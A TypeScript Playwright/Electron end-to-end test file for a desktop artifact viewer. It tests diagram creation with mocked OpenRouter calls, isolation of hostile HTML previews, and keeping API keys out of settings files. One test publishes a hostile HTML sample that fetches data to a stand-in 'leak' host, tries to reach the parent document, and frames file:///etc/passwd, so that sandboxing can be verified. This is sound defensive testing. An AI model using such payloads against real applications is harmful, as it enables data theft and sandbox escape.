import { expect, test } from "vite-plus/test";
import { _electron as electron } from "@playwright/test";
import { createRequire } from "node:module";
import { mkdtemp, rm, readFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { startHub } from "../apps/hub/src/server.ts";
import { ScopeClient } from "@irudd-scope/protocol/client";

const require = createRequire(new URL("../apps/desktop/package.json", import.meta.url));
test("the diagram tool creates an editable Excalidraw artifact through the desktop provider and hub", async () => {
  const directory = await mkdtemp(join(tmpdir(), "scope-drawing-"));
  const token = "synthetic-drawing-test-hub-token";
  const hub = await startHub({ directory: join(directory, "hub"), token, port: 0 });
  const client = new ScopeClient(hub.url, token);
  const application = await electron.launch({
    executablePath: require("electron") as string,
    args: [resolve("apps/desktop"), "--disable-gpu"],
    env: {
      ...process.env,
      SCOPE_ENDPOINT: hub.url,
      SCOPE_TOKEN: token,
      SCOPE_DESKTOP_DATA_DIR: join(directory, "desktop"),
    },
  });
  try {
    const result = await readFile(
      new URL("./fixtures/diagram-response.json", import.meta.url),
      "utf8",
    );
    await application.evaluate((_electron, output) => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) =>
        url === "https://openrouter.ai/api/v1/chat/completions"
          ? Response.json({
              choices: [{ message: { content: output }, finish_reason: "stop" }],
              usage: { prompt_tokens: 80, completion_tokens: 40, cost: 0.001 },
            })
          : original(url, init);
    }, result);
    const page = await application.firstWindow();
    const errors: string[] = [];
    page.on("pageerror", (error) => errors.push(error.message));
    await page.getByRole("button", { name: "Settings", exact: true }).click();
    await page.getByLabel("OpenRouter API key").fill("synthetic-diagram-key");
    await page.getByRole("button", { name: "Save settings" }).click();
    await page.getByText("Settings saved.").waitFor();
    await page.getByRole("button", { name: "Done", exact: true }).click();
    await page.getByRole("button", { name: "Create diagram", exact: true }).click();
    await page.getByLabel("What should the diagram show?").fill("A browser talks to an API.");
    await page.getByRole("button", { name: "Create diagram", exact: true }).click();
    await page.getByLabel("Change diagram", { exact: true }).waitFor();
    await page.locator(".excalidraw canvas").first().waitFor();
    const artifacts = await client.list();
    expect(artifacts).toHaveLength(1);
    expect(artifacts[0].kind).toBe("excalidraw");
    const saved = JSON.parse(new TextDecoder().decode(await client.content(artifacts[0].id)));
    expect(saved.type).toBe("excalidraw");
    expect(
      saved.elements.filter((element: { type: string }) => element.type === "rectangle"),
    ).toHaveLength(2);
    expect(
      saved.elements.filter((element: { type: string }) => element.type === "arrow"),
    ).toHaveLength(1);
    await application.evaluate(() => {
      const original = globalThis.fetch;
      globalThis.fetch = async (url, init) =>
        url === "https://openrouter.ai/api/v1/chat/completions"
          ? Response.json({
              choices: [
                {
                  message: {
                    content: JSON.stringify({
                      message: "Moved the API.",
                      operations: [{ type: "move", id: "api", x: 540, y: 180 }],
                    }),
                  },
                  finish_reason: "stop",
                },
              ],
            })
          : original(url, init);
    });
    await page.getByLabel("Change diagram", { exact: true }).fill("Move the API right.");
    await page.getByRole("button", { name: "Apply change", exact: true }).click();
    await page.getByRole("button", { name: "Save", exact: true }).click();
    await expect.poll(async () => (await client.get(artifacts[0].id)).revision).toBe(2);
    const updated = JSON.parse(new TextDecoder().decode(await client.content(artifacts[0].id)));
    expect(updated.elements.find((element: { id: string }) => element.id === "agent:api").x).toBe(
      540,
    );
    expect(errors).toEqual([]);
    await page.screenshot({ path: join(directory, "diagram.png") });
  } finally {
    await application.close();
    await hub.close();
    await rm(directory, { recursive: true, force: true });
  }
}, 60_000);

test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps development keys out of files", async () => {
  const directory = await mkdtemp(join(tmpdir(), "scope-desktop-"));
  const token = "synthetic-desktop-test-hub-token";
  const hub = await startHub({ directory: join(directory, "hub"), token, port: 0 });
  const client = new ScopeClient(hub.url, token);
  const settingsDirectory = join(directory, "desktop");
  const launch = () =>
    electron.launch({
      executablePath: require("electron") as string,
      args: [resolve("apps/desktop"), "--disable-gpu"],
      env: {
        ...process.env,
        SCOPE_ENDPOINT: hub.url,
        SCOPE_TOKEN: token,
        SCOPE_DESKTOP_DATA_DIR: settingsDirectory,
      },
    });
  let application: Awaited<ReturnType<typeof launch>> | undefined;
  try {
    application = await launch();
    const page = await application.firstWindow();
    const failures: string[] = [];
    page.on("pageerror", (error) => failures.push(error.message));
    await page.getByRole("heading", { name: "Things your agents leave for you" }).waitFor();
    await client.publish(
      "review",
      {
        title: "Review",
        kind: "markdown",
        mediaType: "text/markdown",
        fileName: "review.md",
        expectedRevision: 0,
      },
      new TextEncoder().encode("# Actual report\nPersist me."),
    );
    await page.getByRole("button", { name: "Review markdown" }).click();
    await page.getByRole("heading", { name: "Actual report" }).waitFor();
    await page.getByRole("button", { name: "Focus artifact" }).click();
    expect(await page.getByRole("navigation", { name: "Open artifacts" }).count()).toBe(0);
    await page.keyboard.press("Escape");
    expect(await page.getByRole("heading", { name: "Actual report" }).isVisible()).toBe(true);
    await client.publish(
      "hostile",
      {
        title: "Hostile preview",
        kind: "html",
        mediaType: "text/html",
        fileName: "hostile.html",
        expectedRevision: 0,
      },
      new TextEncoder().encode(
        `<h1>Isolated preview</h1><script>document.body.dataset.executed='yes';parent.document.body.dataset.compromised='yes';fetch('https://example.invalid/leak')</script><img src="https://example.invalid/pixel"><iframe src="file:///etc/passwd"></iframe><form action="https://example.invalid/submit"><button>Submit</button></form>`,
      ),
    );
    expect(await page.getByRole("heading", { name: "Actual report" }).isVisible()).toBe(true);
    await page.getByRole("button", { name: "Find artifacts and tools" }).click();
    await page.getByRole("button", { name: "Hostile preview html" }).click();
    const preview = page.frameLocator('iframe[title="Hostile preview"]');
    await preview.getByRole("heading", { name: "Isolated preview" }).waitFor();
    expect(await preview.locator("body").getAttribute("data-executed")).toBeNull();
    expect(await page.locator("body").getAttribute("data-compromised")).toBeNull();
    const frame = page.frames().find((candidate) => candidate !== page.mainFrame())!;
    expect(
      await frame.evaluate(() => ({
        node: typeof (globalThis as unknown as { require?: unknown }).require,
        scope: typeof (globalThis as unknown as { scope?: unknown }).scope,
      })),
    ).toEqual({ node: "undefined", scope: "undefined" });
    expect(
      await frame.evaluate(() => {
        try {
          return Boolean(parent.document.body);
        } catch {
          return false;
        }
      }),
    ).toBe(false);
    await page.getByRole("button", { name: "Settings", exact: true }).click();
    await page.getByLabel("OpenRouter API key").fill("synthetic-desktop-api-key");
    await page.getByRole("button", { name: "Save settings" }).click();
    await page.getByText("Settings saved.").waitFor();
    expect(await page.getByLabel("OpenRouter API key").inputValue()).toBe("");
    expect(await readFile(join(settingsDirectory, "settings.json"), "utf8")).not.toContain(
      "synthetic-desktop-api-key",
    );
    await page.getByRole("button", { name: "Remove key" }).click();
    await page.getByText("No key saved").waitFor();
    await page.getByRole("button", { name: "Done", exact: true }).click();
    expect(failures).toEqual([]);
    await application.close();
    application = await launch();
    const reopened = await application.firstWindow();
    await reopened
      .frameLocator('iframe[title="Hostile preview"]')
      .getByRole("heading", { name: "Isolated preview" })
      .waitFor();
    expect(await reopened.getByRole("button", { name: "Close Review", exact: true }).count()).toBe(
      1,
    );
  } finally {
    await application?.close();
    await hub.close();
    await rm(directory, { recursive: true, force: true });
  }
}, 60_000);
